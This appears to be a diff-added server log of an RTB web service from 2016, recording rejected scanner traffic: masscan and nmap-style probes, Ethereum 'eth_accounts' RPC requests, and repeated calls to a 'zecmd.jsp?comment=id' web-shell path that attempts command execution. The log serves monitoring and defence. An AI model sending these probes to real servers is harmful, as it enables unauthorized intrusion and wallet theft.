+[WARN] [2016-08-29 16:10:47,959] [rtb-server-akka.actor.default-dispatcher-18] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-30 15:21:54,039] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request header: Illegal 'User-Agent' header: Unexpected end of input, expected '\', Text or ')' (line 1, pos 50):
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1
+                                                 ^
+
+[WARN] [2016-08-31 12:25:39,697] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-31 12:25:40,249] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-31 12:25:40,922] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-08-31 12:25:41,572] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-08-31 12:25:42,167] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-08-31 12:25:53,547] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-08-31 12:25:54,355] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-08-31 12:26:08,138] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-08-31 12:26:08,720] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   i  eU??r
+[WARN] [2016-08-31 12:26:09,329] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-08-31 12:26:09,911] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-08-31 12:26:26,473] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-08-31 12:26:30,144] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-08-31 12:26:36,048] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-08-31 12:26:36,824] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-08-31 12:26:38,406] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-08-31 12:26:39,197] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-08-31 12:26:39,983] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-08-31 12:26:48,250] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (???       
+[WARN] [2016-08-31 16:10:20,274] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request header: Illegal 'User-Agent' header: Unexpected end of input, expected '\', Text or ')' (line 1, pos 50):
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1
+                                                 ^
+
+[WARN] [2016-09-03 14:15:09,208] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-05 10:42:52,025] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-07 13:44:28,195] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-10 20:25:41,685] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-11 01:24:39,861] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-11 04:58:51,169] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-11 08:47:55,656] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-11 23:18:26,851] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-12 01:58:51,400] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-12 12:19:50,175] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-12 19:23:27,758] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Request is missing required `Host` header
+[WARN] [2016-09-14 13:25:00,920] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-14 14:54:08,012] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-14 19:16:04,640] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-14 19:16:04,883] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-14 19:16:05,137] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-14 19:16:05,388] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-14 19:16:05,641] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-09-14 19:16:16,128] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-09-14 19:16:16,375] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-09-14 19:16:29,362] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-09-14 19:16:29,601] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-09-14 19:16:29,847] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-09-14 19:16:45,455] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-14 19:16:45,702] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-09-14 19:16:51,069] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-09-14 19:16:51,318] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-09-14 19:16:51,566] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-09-14 19:16:51,811] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-09-14 19:16:52,057] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-09-14 19:18:24,835] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (!
+[WARN] [2016-09-14 19:18:24,835] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-15 23:22:17,756] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-16 02:24:37,115] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-17 19:37:28,413] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-17 19:37:31,216] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-17 19:37:32,334] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-17 19:37:32,657] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-17 19:37:33,171] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-09-17 19:37:36,593] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: <soap:Envelope
+[WARN] [2016-09-17 19:37:41,481] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-09-17 19:37:41,640] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-09-17 19:37:44,949] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-09-17 19:37:45,208] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   i  eU??r
+[WARN] [2016-09-17 19:37:45,392] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-09-17 19:37:45,612] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-09-17 19:37:48,941] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: 0?   -c?   $
+[WARN] [2016-09-17 19:37:50,699] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-17 19:37:50,899] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-09-17 19:37:52,644] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-09-17 19:37:52,798] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-09-17 19:37:52,951] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-09-17 19:37:53,107] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-09-17 19:37:53,281] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-09-17 19:37:53,438] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: GIOP  $       
+[WARN] [2016-09-17 19:37:53,607] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  MQTT  be
+[WARN] [2016-09-17 19:37:53,775] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? +<M      
+[WARN] [2016-09-18 13:15:50,835] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-20 10:21:58,274] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    {????
+[WARN] [2016-09-21 09:04:11,440] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-21 13:33:09,961] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-22 00:12:45,227] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(POST,/,List(Content-Type: application/x-www-form-urlencoded, Content-Length: 32, Accept: */*),HttpEntity(application/x-www-form-urlencoded,{"id":0,"method":"eth_accounts"}),HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-24 06:10:51,087] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-24 10:53:32,948] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-24 11:57:54,304] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-26 01:00:33,643] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(POST,/,List(Content-Type: application/x-www-form-urlencoded, Content-Length: 32, Accept: */*),HttpEntity(application/x-www-form-urlencoded,{"id":0,"method":"eth_accounts"}),HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-26 08:57:26,962] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-09-28 13:38:38,442] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-28 19:46:14,010] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-09-30 06:49:07,674] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-01 18:15:41,531] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-03 09:19:23,457] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-03 14:09:53,843] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-03 14:29:03,132] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-03 20:38:44,611] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-05 05:22:44,357] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-05 10:29:35,406] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-05 13:40:29,896] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-06 04:24:36,530] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-06 04:55:16,037] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-06 08:38:25,704] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-07 14:45:38,846] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-07 17:47:17,882] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/login.asp,List(Connection: close),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-08 04:31:09,443] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-08 14:57:46,605] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: 
+[WARN] [2016-10-10 04:44:58,123] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-10 06:46:44,304] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-10 09:59:26,160] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-10 17:14:36,814] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-10 17:32:25,162] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-11 03:08:00,652] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-11 03:08:04,287] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-11 03:08:05,371] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
